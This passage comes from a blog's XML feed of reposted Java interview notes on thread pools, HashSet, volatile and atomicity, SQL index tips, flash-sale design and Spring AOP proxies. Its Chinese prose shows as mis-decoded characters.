    <content type="text"><![CDATA[çº¿ç¨‹æ± åŸç†åˆ†æé¦–å…ˆè¦æ˜ç¡®ä¸ºä»€ä¹ˆè¦ä½¿ç”¨çº¿ç¨‹æ± ï¼Œä½¿ç”¨çº¿ç¨‹æ± ä¼šå¸¦æ¥ä»€ä¹ˆå¥½å¤„ï¼Ÿ çº¿ç¨‹æ˜¯ç¨€ç¼ºèµ„æºï¼Œä¸èƒ½é¢‘ç¹çš„åˆ›å»ºã€‚ åº”å½“å°†å…¶æ”¾å…¥ä¸€ä¸ªæ± å­ä¸­ï¼Œå¯ä»¥ç»™å…¶ä»–ä»»åŠ¡è¿›è¡Œå¤ç”¨ã€‚ è§£è€¦ä½œç”¨ï¼Œçº¿ç¨‹çš„åˆ›å»ºäºæ‰§è¡Œå®Œå…¨åˆ†å¼€ï¼Œæ–¹ä¾¿ç»´æŠ¤ã€‚ åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ± ä»¥ä¸€ä¸ªä½¿ç”¨è¾ƒå¤šçš„ 1ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, RejectedExecutionHandler handler) ä¸ºä¾‹ï¼š å…¶ä¸­çš„ corePoolSize ä¸ºçº¿ç¨‹æ± çš„åŸºæœ¬å¤§å°ã€‚ maximumPoolSize ä¸ºçº¿ç¨‹æ± æœ€å¤§çº¿ç¨‹å¤§å°ã€‚ keepAliveTime å’Œ unit åˆ™æ˜¯çº¿ç¨‹ç©ºé—²åçš„å­˜æ´»æ—¶é—´ã€‚ workQueue ç”¨äºå­˜æ”¾ä»»åŠ¡çš„é˜»å¡é˜Ÿåˆ—ã€‚ handler å½“é˜Ÿåˆ—å’Œæœ€å¤§çº¿ç¨‹æ± éƒ½æ»¡äº†ä¹‹åçš„é¥±å’Œç­–ç•¥ã€‚ å¤„ç†æµç¨‹å½“æäº¤ä¸€ä¸ªä»»åŠ¡åˆ°çº¿ç¨‹æ± æ—¶å®ƒçš„æ‰§è¡Œæµç¨‹æ˜¯æ€æ ·çš„å‘¢ï¼Ÿ é¦–å…ˆç¬¬ä¸€æ­¥ä¼šåˆ¤æ–­æ ¸å¿ƒçº¿ç¨‹æ•°æœ‰æ²¡æœ‰è¾¾åˆ°ä¸Šé™ï¼Œå¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºçº¿ç¨‹(ä¼šè·å–å…¨å±€é”)ï¼Œæ»¡äº†åˆ™ä¼šå°†ä»»åŠ¡ä¸¢è¿›é˜»å¡é˜Ÿåˆ—ã€‚ å¦‚æœé˜Ÿåˆ—ä¹Ÿæ»¡äº†åˆ™éœ€è¦åˆ¤æ–­æœ€å¤§çº¿ç¨‹æ•°æ˜¯å¦è¾¾åˆ°ä¸Šé™ï¼Œå¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºçº¿ç¨‹(è·å–å…¨å±€é”)ï¼Œå¦‚æœæœ€å¤§çº¿ç¨‹æ•°ä¹Ÿæ»¡äº†åˆ™ä¼šæ ¹æ®é¥±å’Œç­–ç•¥å¤„ç†ã€‚ å¸¸ç”¨çš„é¥±å’Œç­–ç•¥æœ‰: ç›´æ¥ä¸¢å¼ƒä»»åŠ¡ã€‚ è°ƒç”¨è€…çº¿ç¨‹å¤„ç†ã€‚ ä¸¢å¼ƒé˜Ÿåˆ—ä¸­çš„æœ€è¿‘ä»»åŠ¡ï¼Œæ‰§è¡Œå½“å‰ä»»åŠ¡ã€‚ æ‰€ä»¥å½“çº¿ç¨‹æ± å®Œæˆé¢„çƒ­ä¹‹åéƒ½æ˜¯å°†ä»»åŠ¡æ”¾å…¥é˜Ÿåˆ—ï¼Œæ¥ç€ç”±å·¥ä½œçº¿ç¨‹ä¸€ä¸ªä¸ªä»é˜Ÿåˆ—é‡Œå–å‡ºæ‰§è¡Œã€‚ åˆç†é…ç½®çº¿ç¨‹æ± çº¿ç¨‹æ± å¹¶ä¸æ˜¯é…ç½®è¶Šå¤§è¶Šå¥½ï¼Œè€Œæ˜¯è¦æ ¹æ®ä»»åŠ¡çš„ç†Ÿæ‚‰æ¥è¿›è¡Œåˆ’åˆ†ï¼šå¦‚æœæ˜¯ CPU å¯†é›†å‹ä»»åŠ¡åº”å½“åˆ†é…è¾ƒå°‘çš„çº¿ç¨‹ï¼Œæ¯”å¦‚ CPU ä¸ªæ•°ç›¸å½“çš„å¤§å°ã€‚ å¦‚æœæ˜¯ IO å¯†é›†å‹ä»»åŠ¡ï¼Œç”±äºçº¿ç¨‹å¹¶ä¸æ˜¯ä¸€ç›´åœ¨è¿è¡Œï¼Œæ‰€ä»¥å¯ä»¥å°½å¯èƒ½çš„å¤šé…ç½®çº¿ç¨‹ï¼Œæ¯”å¦‚ CPU ä¸ªæ•° * 2 ã€‚ å½“æ˜¯ä¸€ä¸ªæ··åˆå‹ä»»åŠ¡ï¼Œå¯ä»¥å°†å…¶æ‹†åˆ†ä¸º CPU å¯†é›†å‹ä»»åŠ¡ä»¥åŠ IO å¯†é›†å‹ä»»åŠ¡ï¼Œè¿™æ ·æ¥åˆ†åˆ«é…ç½®ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HashSet]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2Fcollection%2FHashSet%2F</url>
    <content type="text"><![CDATA[HashSetHashSet æ˜¯ä¸€ä¸ªä¸å…è®¸å­˜å‚¨é‡å¤å…ƒç´ çš„é›†åˆï¼Œå®ƒçš„å®ç°æ¯”è¾ƒç®€å•ï¼Œåªè¦ç†è§£äº† HashMapï¼ŒHashSet å°±æ°´åˆ°æ¸ æˆäº†ã€‚ æˆå‘˜å˜é‡é¦–å…ˆäº†è§£ä¸‹ HashSet çš„æˆå‘˜å˜é‡: 1234private transient HashMap&lt;E,Object&gt; map;// Dummy value to associate with an Object in the backing Mapprivate static final Object PRESENT = new Object(); å‘ç°ä¸»è¦å°±ä¸¤ä¸ªå˜é‡: map ï¼šç”¨äºå­˜æ”¾æœ€ç»ˆæ•°æ®çš„ã€‚ PRESENT ï¼šæ˜¯æ‰€æœ‰å†™å…¥ map çš„ value å€¼ã€‚ æ„é€ å‡½æ•°1234567public HashSet() &#123; map = new HashMap&lt;&gt;();&#125;public HashSet(int initialCapacity, float loadFactor) &#123; map = new HashMap&lt;&gt;(initialCapacity, loadFactor);&#125; æ„é€ å‡½æ•°å¾ˆç®€å•ï¼Œåˆ©ç”¨äº† HashMap åˆå§‹åŒ–äº† map ã€‚ add123public boolean add(E e) &#123; return map.put(e, PRESENT)==null;&#125; æ¯”è¾ƒå…³é”®çš„å°±æ˜¯è¿™ä¸ª add() æ–¹æ³•ã€‚å¯ä»¥çœ‹å‡ºå®ƒæ˜¯å°†å­˜æ”¾çš„å¯¹è±¡å½“åšäº† HashMap çš„å¥ï¼Œvalue éƒ½æ˜¯ç›¸åŒçš„ PRESENT ã€‚ç”±äº HashMap çš„ key æ˜¯ä¸èƒ½é‡å¤çš„ï¼Œæ‰€ä»¥æ¯å½“æœ‰é‡å¤çš„å€¼å†™å…¥åˆ° HashSet æ—¶ï¼Œvalue ä¼šè¢«è¦†ç›–ï¼Œä½† key ä¸ä¼šæ”¶åˆ°å½±å“ï¼Œè¿™æ ·å°±ä¿è¯äº† HashSet ä¸­åªèƒ½å­˜æ”¾ä¸é‡å¤çš„å…ƒç´ ã€‚ æ€»ç»“HashSet çš„åŸç†æ¯”è¾ƒç®€å•ï¼Œå‡ ä¹å…¨éƒ¨å€ŸåŠ©äº HashMap æ¥å®ç°çš„ã€‚ æ‰€ä»¥ HashMap ä¼šå‡ºç°çš„é—®é¢˜ HashSet ä¾ç„¶ä¸èƒ½é¿å…ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Threadcore]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FThreadcore%2F</url>
    <content type="text"><![CDATA[Java å¤šçº¿ç¨‹ä¸‰å¤§æ ¸å¿ƒåŸå­æ€§Java çš„åŸå­æ€§å°±å’Œæ•°æ®åº“äº‹ç‰©çš„åŸå­æ€§å·®ä¸å¤šï¼Œä¸€ä¸ªæ“ä½œä¸­è¦ä¹ˆå…¨éƒ¨æ‰§è¡ŒæˆåŠŸæˆ–è€…å¤±è´¥ã€‚ JMM åªæ˜¯ä¿è¯äº†åŸºæœ¬çš„åŸå­æ€§ï¼Œä½†ç±»ä¼¼äº i++ ä¹‹ç±»çš„æ“ä½œï¼Œçœ‹ä¼¼æ˜¯åŸå­æ“ä½œï¼Œå…¶å®é‡Œé¢æ¶‰åŠåˆ°: è·å– i çš„å€¼ã€‚ è‡ªå¢ã€‚ å†èµ‹å€¼ç»™ iã€‚ è¿™ä¸‰æ­¥æ“ä½œï¼Œæ‰€ä»¥æƒ³è¦å®ç° i++ è¿™æ ·çš„åŸå­æ“ä½œå°±éœ€è¦ç”¨åˆ° synchronize æˆ–è€…æ˜¯ lock è¿›è¡ŒåŠ é”å¤„ç†ã€‚ å¦‚æœæ˜¯åŸºç¡€ç±»çš„è‡ªå¢æ“ä½œå¯ä»¥ä½¿ç”¨ AtomicInteger è¿™æ ·çš„åŸå­ç±»æ¥å®ç°(å…¶æœ¬è´¨æ˜¯åˆ©ç”¨äº† CPU çº§åˆ«çš„ çš„ CAS æŒ‡ä»¤æ¥å®Œæˆçš„)ã€‚ å…¶ä¸­ç”¨çš„æœ€å¤šçš„æ–¹æ³•å°±æ˜¯: incrementAndGet() ä»¥åŸå­çš„æ–¹å¼è‡ªå¢ã€‚æºç å¦‚ä¸‹: 12345678public final long incrementAndGet() &#123; for (;;) &#123; long current = get(); long next = current + 1; if (compareAndSet(current, next)) return next; &#125; &#125; é¦–å…ˆæ˜¯è·å¾—å½“å‰çš„å€¼ï¼Œç„¶åè‡ªå¢ +1ã€‚æ¥ç€åˆ™æ˜¯æœ€æ ¸å¿ƒçš„ compareAndSet() æ¥è¿›è¡ŒåŸå­æ›´æ–°ã€‚ 123public final boolean compareAndSet(long expect, long update) &#123; return unsafe.compareAndSwapLong(this, valueOffset, expect, update); &#125; å…¶é€»è¾‘å°±æ˜¯åˆ¤æ–­å½“å‰çš„å€¼æ˜¯å¦è¢«æ›´æ–°è¿‡ï¼Œæ˜¯å¦ç­‰äº currentï¼Œå¦‚æœç­‰äºå°±è¯´æ˜æ²¡æœ‰æ›´æ–°è¿‡ç„¶åå°†å½“å‰çš„å€¼æ›´æ–°ä¸º nextï¼Œå¦‚æœä¸ç­‰äºåˆ™è¿”å›false è¿›å…¥å¾ªç¯ï¼Œç›´åˆ°æ›´æ–°æˆåŠŸä¸ºæ­¢ã€‚ è¿˜æœ‰å…¶ä¸­çš„ get() æ–¹æ³•ä¹Ÿå¾ˆå…³é”®ï¼Œè¿”å›çš„æ˜¯å½“å‰çš„å€¼ï¼Œå½“å‰å€¼ç”¨äº† volatile å…³é”®è¯ä¿®é¥°ï¼Œä¿è¯äº†å†…å­˜å¯è§æ€§ã€‚ 1private volatile int value; å¯è§æ€§ç°ä»£è®¡ç®—æœºä¸­ï¼Œç”±äº CPU ç›´æ¥ä»ä¸»å†…å­˜ä¸­è¯»å–æ•°æ®çš„æ•ˆç‡ä¸é«˜ï¼Œæ‰€ä»¥éƒ½ä¼šå¯¹åº”çš„ CPU é«˜é€Ÿç¼“å­˜ï¼Œå…ˆå°†ä¸»å†…å­˜ä¸­çš„æ•°æ®è¯»å–åˆ°ç¼“å­˜ä¸­ï¼Œçº¿ç¨‹ä¿®æ”¹æ•°æ®ä¹‹åé¦–å…ˆæ›´æ–°åˆ°ç¼“å­˜ï¼Œä¹‹åæ‰ä¼šæ›´æ–°åˆ°ä¸»å†…å­˜ã€‚å¦‚æœæ­¤æ—¶è¿˜æ²¡æœ‰å°†æ•°æ®æ›´æ–°åˆ°ä¸»å†…å­˜å…¶ä»–çš„çº¿ç¨‹æ­¤æ—¶æ¥è¯»å–å°±æ˜¯ä¿®æ”¹ä¹‹å‰çš„æ•°æ®ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºã€‚ volatile å…³é”®å­—å°±æ˜¯ç”¨äºä¿è¯å†…å­˜å¯è§æ€§ï¼Œå½“çº¿ç¨‹Aæ›´æ–°äº† volatile ä¿®é¥°çš„å˜é‡æ—¶ï¼Œå®ƒä¼šç«‹å³åˆ·æ–°åˆ°ä¸»çº¿ç¨‹ï¼Œå¹¶ä¸”å°†å…¶ä½™ç¼“å­˜ä¸­è¯¥å˜é‡çš„å€¼æ¸…ç©ºï¼Œå¯¼è‡´å…¶ä½™çº¿ç¨‹åªèƒ½å»ä¸»å†…å­˜è¯»å–æœ€æ–°å€¼ã€‚ ä½¿ç”¨ volatile å…³é”®è¯ä¿®é¥°çš„å˜é‡æ¯æ¬¡è¯»å–éƒ½ä¼šå¾—åˆ°æœ€æ–°çš„æ•°æ®ï¼Œä¸ç®¡å“ªä¸ªçº¿ç¨‹å¯¹è¿™ä¸ªå˜é‡çš„ä¿®æ”¹éƒ½ä¼šç«‹å³åˆ·æ–°åˆ°ä¸»å†…å­˜ã€‚ synchronizeå’ŒåŠ é”ä¹Ÿèƒ½èƒ½ä¿è¯å¯è§æ€§ï¼Œå®ç°åŸç†å°±æ˜¯åœ¨é‡Šæ”¾é”ä¹‹å‰å…¶ä½™çº¿ç¨‹æ˜¯è®¿é—®ä¸åˆ°è¿™ä¸ªå…±äº«å˜é‡çš„ã€‚ä½†æ˜¯å’Œ volatile ç›¸æ¯”å¼€é”€è¾ƒå¤§ã€‚ é¡ºåºæ€§ä»¥ä¸‹è¿™æ®µä»£ç : 123int a = 100 ; //1int b = 200 ; //2int c = a + b ; //3 æ­£å¸¸æƒ…å†µä¸‹çš„æ‰§è¡Œé¡ºåºåº”è¯¥æ˜¯ 1&gt;&gt;2&gt;&gt;3ã€‚ä½†æ˜¯æœ‰æ—¶ JVM ä¸ºäº†æé«˜æ•´ä½“çš„æ•ˆç‡ä¼šè¿›è¡ŒæŒ‡ä»¤é‡æ’å¯¼è‡´æ‰§è¡Œçš„é¡ºåºå¯èƒ½æ˜¯ 2&gt;&gt;1&gt;&gt;3ã€‚ä½†æ˜¯ JVM ä¹Ÿä¸èƒ½æ˜¯ä»€ä¹ˆéƒ½è¿›è¡Œé‡æ’ï¼Œæ˜¯åœ¨ä¿è¯æœ€ç»ˆç»“æœå’Œä»£ç é¡ºåºæ‰§è¡Œç»“æœä¸€è‡´çš„æƒ…å†µä¸‹æ‰å¯èƒ½è¿›è¡Œé‡æ’ã€‚ é‡æ’åœ¨å•çº¿ç¨‹ä¸­ä¸ä¼šå‡ºç°é—®é¢˜ï¼Œä½†åœ¨å¤šçº¿ç¨‹ä¸­ä¼šå‡ºç°æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚ Java ä¸­å¯ä»¥ä½¿ç”¨ volatile æ¥ä¿è¯é¡ºåºæ€§ï¼Œsynchronize å’Œ lock ä¹Ÿå¯ä»¥æ¥ä¿è¯æœ‰åºæ€§ï¼Œå’Œä¿è¯åŸå­æ€§çš„æ–¹å¼ä¸€æ ·ï¼Œé€šè¿‡åŒä¸€æ®µæ—¶é—´åªèƒ½ä¸€ä¸ªçº¿ç¨‹è®¿é—®æ¥å®ç°çš„ã€‚ é™¤äº†é€šè¿‡ volatile å…³é”®å­—æ˜¾å¼çš„ä¿è¯é¡ºåºä¹‹å¤–ï¼Œ JVM è¿˜é€šè¿‡ happen-before åŸåˆ™æ¥éšå¼çš„ä¿è¯é¡ºåºæ€§ã€‚ å…¶ä¸­æœ‰ä¸€æ¡å°±æ˜¯é€‚ç”¨äº volatile å…³é”®å­—çš„ï¼Œé’ˆå¯¹äº volatile å…³é”®å­—çš„å†™æ“ä½œè‚¯å®šæ˜¯åœ¨è¯»æ“ä½œä¹‹å‰ï¼Œä¹Ÿå°±æ˜¯è¯´è¯»å–çš„å€¼è‚¯å®šæ˜¯æœ€æ–°çš„ã€‚ volatile çš„åº”ç”¨åŒé‡æ£€æŸ¥é”çš„å•ä¾‹æ¨¡å¼å¯ä»¥ç”¨ volatile å®ç°ä¸€ä¸ªåŒé‡æ£€æŸ¥é”çš„å•ä¾‹æ¨¡å¼ï¼š 123456789101112131415public class Singleton&#123; private static volatile Singleton singleton ; private Singleton()&#123;&#125; public static Singleton getInstance()&#123; if(singleton == null)&#123; synchronize(Singleton.class)&#123; if(singleton == null)&#123; singleton = new Singleton(); &#125; &#125; &#125; return singleton ; &#125; &#125; è¿™é‡Œçš„ volatile å…³é”®å­—ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢æŒ‡ä»¤é‡æ’ã€‚å¦‚æœä¸ç”¨ volatile ï¼Œsingleton = new Singleton();ï¼Œè¿™æ®µä»£ç å…¶å®æ˜¯åˆ†ä¸ºä¸‰æ­¥ï¼š åˆ†é…å†…å­˜ç©ºé—´ã€‚(1) åˆå§‹åŒ–å¯¹è±¡ã€‚(2) å°† singleton å¯¹è±¡æŒ‡å‘åˆ†é…çš„å†…å­˜åœ°å€ã€‚(3) åŠ ä¸Š volatile æ˜¯ä¸ºäº†è®©ä»¥ä¸Šçš„ä¸‰æ­¥æ“ä½œé¡ºåºæ‰§è¡Œï¼Œåä¹‹æœ‰å¯èƒ½ç¬¬äºŒæ­¥åœ¨ç¬¬ä¸‰æ­¥ä¹‹å‰è¢«æ‰§è¡Œå°±æœ‰å¯èƒ½æŸä¸ªçº¿ç¨‹æ‹¿åˆ°çš„å•ä¾‹å¯¹è±¡æ˜¯è¿˜æ²¡æœ‰åˆå§‹åŒ–çš„ï¼Œä»¥è‡´äºæŠ¥é”™ã€‚ æ§åˆ¶åœæ­¢çº¿ç¨‹çš„æ ‡è®°123456789101112private volatile boolean flag ;private void run()&#123; new Thread(new Runnable()&#123; if(flag)&#123; doSomeThing(); &#125; &#125;);&#125;private void stop()&#123; flag = false ;&#125; è¿™é‡Œå¦‚æœæ²¡æœ‰ç”¨ volatile æ¥ä¿®é¥° flag ï¼Œå°±æœ‰å¯èƒ½å…¶ä¸­ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨äº† stop()æ–¹æ³•ä¿®æ”¹äº† flag çš„å€¼å¹¶ä¸ä¼šç«‹å³åˆ·æ–°åˆ°ä¸»å†…å­˜ä¸­ï¼Œå¯¼è‡´è¿™ä¸ªå¾ªç¯å¹¶ä¸ä¼šç«‹å³åœæ­¢ã€‚ è¿™é‡Œä¸»è¦åˆ©ç”¨çš„æ˜¯ volatile çš„å†…å­˜å¯è§æ€§ã€‚ æ€»ç»“ä¸€ä¸‹: volatile å…³é”®å­—åªèƒ½ä¿è¯å¯è§æ€§ï¼Œé¡ºåºæ€§ï¼Œä¸èƒ½ä¿è¯åŸå­æ€§ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL-optimization]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FSQL-optimization%2F</url>
    <content type="text"><![CDATA[SQL ä¼˜åŒ–è´Ÿå‘æŸ¥è¯¢ä¸èƒ½ä½¿ç”¨ç´¢å¼•1select name from user where id not in (1,3,4); åº”è¯¥ä¿®æ”¹ä¸º: 1select name from user where id in (2,5,6); å‰å¯¼æ¨¡ç³ŠæŸ¥è¯¢ä¸èƒ½ä½¿ç”¨ç´¢å¼•å¦‚: 1select name from user where name like '%zhangsan' éå‰å¯¼åˆ™å¯ä»¥:1select name from user where name like 'zhangsan%' å»ºè®®å¯ä»¥è€ƒè™‘ä½¿ç”¨ Lucene ç­‰å…¨æ–‡ç´¢å¼•å·¥å…·æ¥ä»£æ›¿é¢‘ç¹çš„æ¨¡ç³ŠæŸ¥è¯¢ã€‚ æ•°æ®åŒºåˆ†ä¸æ˜æ˜¾çš„ä¸å»ºè®®åˆ›å»ºç´¢å¼•å¦‚ user è¡¨ä¸­çš„æ€§åˆ«å­—æ®µï¼Œå¯ä»¥æ˜æ˜¾åŒºåˆ†çš„æ‰å»ºè®®åˆ›å»ºç´¢å¼•ï¼Œå¦‚èº«ä»½è¯ç­‰å­—æ®µã€‚ å­—æ®µçš„é»˜è®¤å€¼ä¸è¦ä¸º nullè¿™æ ·ä¼šå¸¦æ¥å’Œé¢„æœŸä¸ä¸€è‡´çš„æŸ¥è¯¢ç»“æœã€‚ åœ¨å­—æ®µä¸Šè¿›è¡Œè®¡ç®—ä¸èƒ½å‘½ä¸­ç´¢å¼•1select name from user where FROM_UNIXTIME(create_time) &lt; CURDATE(); åº”è¯¥ä¿®æ”¹ä¸º: 1select name from user where create_time &lt; FROM_UNIXTIME(CURDATE()); æœ€å·¦å‰ç¼€é—®é¢˜å¦‚æœç»™ user è¡¨ä¸­çš„ username pwd å­—æ®µåˆ›å»ºäº†å¤åˆç´¢å¼•é‚£ä¹ˆä½¿ç”¨ä»¥ä¸‹SQL éƒ½æ˜¯å¯ä»¥å‘½ä¸­ç´¢å¼•: 12345select username from user where username='zhangsan' and pwd ='axsedf1sd'select username from user where pwd ='axsedf1sd' and username='zhangsan'select username from user where username='zhangsan' ä½†æ˜¯ä½¿ç”¨ 1select username from user where pwd ='axsedf1sd' æ˜¯ä¸èƒ½å‘½ä¸­ç´¢å¼•çš„ã€‚ å¦‚æœæ˜ç¡®çŸ¥é“åªæœ‰ä¸€æ¡è®°å½•è¿”å›1select name from user where username='zhangsan' limit 1 å¯ä»¥æé«˜æ•ˆç‡ï¼Œå¯ä»¥è®©æ•°æ®åº“åœæ­¢æ¸¸æ ‡ç§»åŠ¨ã€‚ ä¸è¦è®©æ•°æ®åº“å¸®æˆ‘ä»¬åšå¼ºåˆ¶ç±»å‹è½¬æ¢1select name from user where telno=18722222222 è¿™æ ·è™½ç„¶å¯ä»¥æŸ¥å‡ºæ•°æ®ï¼Œä½†æ˜¯ä¼šå¯¼è‡´å…¨è¡¨æ‰«æã€‚ éœ€è¦ä¿®æ”¹ä¸º1select name from user where telno=&apos;18722222222&apos; å¦‚æœéœ€è¦è¿›è¡Œ join çš„å­—æ®µä¸¤è¡¨çš„å­—æ®µç±»å‹è¦ç›¸åŒä¸ç„¶ä¹Ÿä¸ä¼šå‘½ä¸­ç´¢å¼•ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spike]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FSpike%2F</url>
    <content type="text"><![CDATA[è®¾è®¡ä¸€ä¸ªç§’æ€ç³»ç»Ÿä¸»è¦åšåˆ°ä»¥ä¸‹ä¸¤ç‚¹: å°½é‡å°†è¯·æ±‚è¿‡æ»¤åœ¨ä¸Šæ¸¸ã€‚ å°½å¯èƒ½çš„åˆ©ç”¨ç¼“å­˜(å¤§å¤šæ•°åœºæ™¯ä¸‹éƒ½æ˜¯æŸ¥å¤šäºå†™)ã€‚ å¸¸ç”¨çš„ç³»ç»Ÿåˆ†å±‚ç»“æ„: é’ˆå¯¹äºæµè§ˆå™¨ç«¯ï¼Œå¯ä»¥ä½¿ç”¨ JS è¿›è¡Œè¯·æ±‚è¿‡æ»¤ï¼Œæ¯”å¦‚äº”ç§’é’Ÿä¹‹ç±»åªèƒ½ç‚¹ä¸€æ¬¡æŠ¢è´­æŒ‰é’®ï¼Œäº”ç§’é’Ÿåªèƒ½å…è®¸è¯·æ±‚ä¸€æ¬¡åç«¯æœåŠ¡ã€‚(APP åŒç†) è¿™æ ·å…¶å®å°±å¯ä»¥è¿‡æ»¤æ‰å¤§éƒ¨åˆ†æ™®é€šç”¨æˆ·ã€‚ ä½†æ˜¯é˜²ä¸ä½ç›´æ¥æŠ“åŒ…å¾ªç¯è°ƒç”¨ã€‚è¿™ç§æƒ…å†µå¯ä»¥æœ€ç®€å•çš„å¤„ç†:åœ¨Webå±‚é€šè¿‡é™åˆ¶ä¸€ä¸ª UID äº”ç§’ä¹‹ç±»çš„è¯·æ±‚æœåŠ¡å±‚çš„æ¬¡æ•°(å¯åˆ©ç”¨ Redis å®ç°)ã€‚ ä½†å¦‚æœæ˜¯çœŸçš„æœ‰ 10W ä¸ªä¸åŒçš„ UID æ¥è¯·æ±‚ï¼Œæ¯”å¦‚é»‘å®¢æŠ“è‚‰é¸¡çš„æ–¹å¼ã€‚ è¿™ç§æƒ…å†µå¯ä»¥åœ¨æœåŠ¡å±‚ é’ˆå¯¹äºå†™è¯·æ±‚ä½¿ç”¨è¯·æ±‚é˜Ÿåˆ—ï¼Œå†é€šè¿‡é™æµç®—æ³•(é™æµç®—æ³•)æ¯ç§’é’Ÿæ”¾ä¸€éƒ¨åˆ†è¯·æ±‚åˆ°é˜Ÿåˆ—ã€‚ å¯¹äºè¯»è¯·æ±‚åˆ™å°½é‡ä½¿ç”¨ç¼“å­˜ï¼Œå¯ä»¥æå‰å°†æ•°æ®å‡†å¤‡å¥½ï¼Œä¸ç®¡æ˜¯ Redis è¿˜æ˜¯å…¶ä»–ç¼“å­˜ä¸­é—´ä»¶æ•ˆç‡éƒ½æ˜¯éå¸¸é«˜çš„ã€‚ ps : åˆ·æ–°ç¼“å­˜æƒ…å†µï¼Œæ¯”å¦‚åº“å­˜æ‰£é™¤æˆåŠŸè¿™ç§æƒ…å†µä¸ç”¨é©¬ä¸Šåˆ·æ–°ç¼“å­˜ï¼Œå¦‚æœåº“å­˜æ‰£åˆ°äº† 0 å†åˆ·æ–°ç¼“å­˜ã€‚å› ä¸ºå¤§å¤šæ•°ç”¨æˆ·éƒ½åªå…³å¿ƒæ˜¯å¦æœ‰è´§ï¼Œå¹¶ä¸å…³å¿ƒç°åœ¨è¿˜å‰©ä½™å¤šå°‘ã€‚ æ€»ç»“ å¦‚æœæµé‡å·¨å¤§ï¼Œå¯¼è‡´å„ä¸ªå±‚çš„å‹åŠ›éƒ½å¾ˆå¤§å¯ä»¥é€‚å½“çš„åŠ æœºå™¨æ¨ªå‘æ‰©å®¹ã€‚å¦‚æœåŠ ä¸äº†æœºå™¨é‚£å°±åªæœ‰æ”¾å¼ƒæµé‡ç›´æ¥è¿”å›å¤±è´¥ã€‚å¿«é€Ÿå¤±è´¥éå¸¸é‡è¦ï¼Œè‡³å°‘å¯ä»¥ä¿è¯ç³»ç»Ÿçš„å¯ç”¨æ€§ã€‚ ä¸šåŠ¡åˆ†æ‰¹æ‰§è¡Œï¼šå¯¹äºä¸‹å•ã€ä»˜æ¬¾ç­‰æ“ä½œå¯ä»¥å¼‚æ­¥æ‰§è¡Œæé«˜ååç‡ã€‚ ä¸»è¦ç›®çš„å°±æ˜¯å°½é‡å°‘çš„è¯·æ±‚ç›´æ¥è®¿é—®åˆ° DBã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringAOP]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FSpringAOP%2F</url>
    <content type="text"><![CDATA[Spring AOP å®ç°åŸç†é™æ€ä»£ç†ä¼—æ‰€å‘¨çŸ¥ Spring çš„ AOP æ˜¯åŸºäºåŠ¨æ€ä»£ç†å®ç°çš„ï¼Œè°ˆåˆ°åŠ¨æ€ä»£ç†å°±ä¸å¾—ä¸æä¸‹é™æ€ä»£ç†ã€‚å®ç°å¦‚ä¸‹ï¼š å‡è®¾æœ‰ä¸€æ¥å£ InterfaceAï¼š 123public interface InterfaceA&#123; void exec();&#125; å…¶ä¸­æœ‰å®ç°ç±» RealImplement:12345public class RealImplement implement InterfaceA&#123; public void exec()&#123; System.out.println("real impl") ; &#125;&#125; è¿™æ—¶ä¹Ÿæœ‰ä¸€ä¸ªä»£ç†ç±» ProxyImplement ä¹Ÿå®ç°äº† InterfaceA:12345678910111213141516public class ProxyImplement implement InterfaceA&#123; private InterfaceA interface ; public ProxyImplement()&#123; interface = new RealImplement() ; &#125; public void exec()&#123; System.out.println("dosomethings before); //å®é™…è°ƒç”¨ interface.exec(); System.out.println("dosomethings after); &#125; &#125; ä½¿ç”¨å¦‚ä¸‹:123456public class Main()&#123; public static void main(String[] args)&#123; InterfaceA interface = new ProxyImplement() ; interface.exec(); &#125;&#125; å¯ä»¥çœ‹å‡ºè¿™æ ·çš„ä»£ç†æ–¹å¼è°ƒç”¨è€…å…¶å®éƒ½ä¸çŸ¥é“è¢«ä»£ç†å¯¹è±¡çš„å­˜åœ¨ã€‚ JDK åŠ¨æ€ä»£ç†ä»é™æ€ä»£ç†ä¸­å¯ä»¥çœ‹å‡º: é™æ€ä»£ç†åªèƒ½ä»£ç†ä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå¦‚æœè¦ä»£ç†ä¸€ä¸ªæ¥å£çš„å¤šä¸ªå®ç°çš„è¯éœ€è¦å®šä¹‰ä¸åŒçš„ä»£ç†ç±»ã€‚ 